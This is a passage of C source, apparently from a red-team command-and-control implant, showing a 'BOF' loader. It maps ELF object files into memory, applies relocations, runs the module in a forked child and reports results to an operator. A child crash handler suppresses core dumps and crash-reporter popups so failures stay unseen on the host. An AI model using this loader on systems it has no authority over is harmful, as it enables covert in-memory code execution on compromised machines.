                memcpy(addr, elf_data + sh->sh_offset, sh->sh_size);
            }
            else if (sh->sh_type == SHT_NOBITS)
            {
                memset(addr, 0, aligned_size);
            }
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        Elf64_Shdr *sh = &shdr[i];
        if (sh->sh_type != SHT_RELA)
            continue;
        int target_sec = sh->sh_info;
        if (target_sec >= ehdr->e_shnum || !sections[target_sec])
            continue;
        if (!(shdr[target_sec].sh_flags & SHF_ALLOC))
            continue;
        Elf64_Rela *rela = (Elf64_Rela *)(elf_data + sh->sh_offset);
        int num_rela = sh->sh_size / sizeof(Elf64_Rela);
        void *target_addr = sections[target_sec];
        for (int j = 0; j < num_rela; j++)
        {
            Elf64_Rela *r = &rela[j];
            void *loc = (char *)target_addr + r->r_offset;
            int sym_idx = ELF64_R_SYM(r->r_info);
            if (sym_idx >= sym_table_count)
                continue;
            Elf64_Sym *sym = &symtab[sym_idx];
            char *sym_name = strtab + sym->st_name;
            void *symbol_addr = NULL;
            if (sym->st_shndx != SHN_UNDEF && sym->st_shndx < ehdr->e_shnum &&
                sections[sym->st_shndx])
            {
                symbol_addr = sections[sym->st_shndx] + sym->st_value;
            }
            else
            {
                for (int k = 0; g_external_symbols[k].name; k++)
                {
                    if (strcmp(sym_name, g_external_symbols[k].name) == 0)
                    {
                        symbol_addr = *g_external_symbols[k].ptr;
                        break;
                    }
                }
            }
            if (!symbol_addr)
                continue;

            switch (ELF64_R_TYPE(r->r_info))
            {
            case R_X86_64_64:
                *(uint64_t *)loc = (uint64_t)((uintptr_t)symbol_addr + r->r_addend);
                break;
            case R_X86_64_32:
            {
                uintptr_t value = (uintptr_t)symbol_addr + r->r_addend;
                if (value > 0xFFFFFFFF)
                    continue;
                *(uint32_t *)loc = (uint32_t)value;
                break;
            }
            case R_X86_64_32S:
            {
                intptr_t value = (intptr_t)symbol_addr + r->r_addend;
                if (value < INT32_MIN || value > INT32_MAX)
                    goto cleanup;
                *(int32_t *)loc = (int32_t)value;
                break;
            }
            case R_X86_64_PC32:
            case R_X86_64_PLT32:
            {
                int64_t offset = (int64_t)symbol_addr + r->r_addend - (int64_t)loc;
                if (offset < INT32_MIN || offset > INT32_MAX)
                {
                    void *trampoline = get_or_create_trampoline(symbol_addr, loc);
                    if (!trampoline)
                        continue;
                    offset = (int64_t)trampoline + r->r_addend - (int64_t)loc;
                    if (offset < INT32_MIN || offset > INT32_MAX)
                        continue;
                }
                *(uint32_t *)loc = (uint32_t)offset;
                break;
            }
            }
        }
    }

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        if (shdr[i].sh_type == SHT_SYMTAB)
        {
            int sym_count = shdr[i].sh_size / sizeof(Elf64_Sym);
            for (int j = 0; j < sym_count; j++)
            {
                Elf64_Sym *sym = &symtab[j];
                if (sym->st_name == 0)
                    continue;
                char *name = strtab + sym->st_name;
                if (strcmp(name, functionname) == 0 && sym->st_shndx != SHN_UNDEF)
                {
                    if (sym->st_shndx < ehdr->e_shnum && sections[sym->st_shndx])
                    {
                        entry = (bof_func_t)(sections[sym->st_shndx] + sym->st_value);
                        break;
                    }
                }
            }
        }
    }

    if (!entry)
        goto cleanup;

    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        if (sections[i])
        {
            if (mprotect(sections[i], aligned_sizes[i], PROT_READ | PROT_EXEC) != 0)
            {
                goto cleanup;
            }
        }
    }

    pid_t pid = fork();
    if (pid < 0)
    {
        call_bof_isolated(entry, (char *)argumentdata, (uintptr_t)argumentSize);
    }
    else if (pid == 0)
    {
        /* Crash containment: die silently (no core dump, no desktop crash
         * reporter popup); the parent reports the failure to the operator.
         * BSB_NO_CRASH_GUARD=1 disables it to capture a core dump. */
        if (getenv("BSB_NO_CRASH_GUARD") == NULL)
        {
            struct sigaction sa;
            memset(&sa, 0, sizeof(sa));
            sa.sa_handler = bof_crash_exit;
            sigemptyset(&sa.sa_mask);
            sigaction(SIGSEGV, &sa, NULL);
            sigaction(SIGBUS, &sa, NULL);
            sigaction(SIGILL, &sa, NULL);
            sigaction(SIGFPE, &sa, NULL);
            sigaction(SIGABRT, &sa, NULL);
        }
        call_bof_isolated(entry, (char *)argumentdata, (uintptr_t)argumentSize);
        _exit(0);
    }
    else
    {
        int status;
        waitpid(pid, &status, 0);
        char crash_msg[80];
        if (WIFSIGNALED(status))
        {
            snprintf(crash_msg, sizeof(crash_msg), "[!] BOF terminated by signal %d\n",
                     WTERMSIG(status));
            BeaconOutput(0, crash_msg, (int)strlen(crash_msg));
        }
        else if (WIFEXITED(status) && WEXITSTATUS(status) >= 128 && WEXITSTATUS(status) < 192)
        {
            snprintf(crash_msg, sizeof(crash_msg), "[!] BOF crashed (exit %d)\n",
                     WEXITSTATUS(status));
            BeaconOutput(0, crash_msg, (int)strlen(crash_msg));
        }
    }

cleanup:
    for (int i = 0; i < ehdr->e_shnum; i++)
    {
        if (sections[i])
        {
            munmap(sections[i], aligned_sizes[i]);
        }
    }
    free(sections);
    free(aligned_sizes);
    cleanup_trampolines();
    return (entry != NULL) ? 0 : -1;
}

char *run_bof_and_capture(unsigned char *elf_data, uint32_t filesize, char *args, int arglen,
                          int *out_len)
{
    bsb_output_reset();
    RunELF("go", elf_data, filesize, (unsigned char *)args, arglen);
    size_t produced = g_out_meta ? g_out_meta->len : 0;
    if (produced == 0)
    {
        *out_len = 0;
        return strdup("");
    }
    char *output = malloc(produced + 1);
    if (!output)
    {
        *out_len = 0;
        return strdup("");
    }
    memcpy(output, g_beacon_output, produced);
    output[produced] = '\0';
    *out_len = (int)produced;
    return output;
}
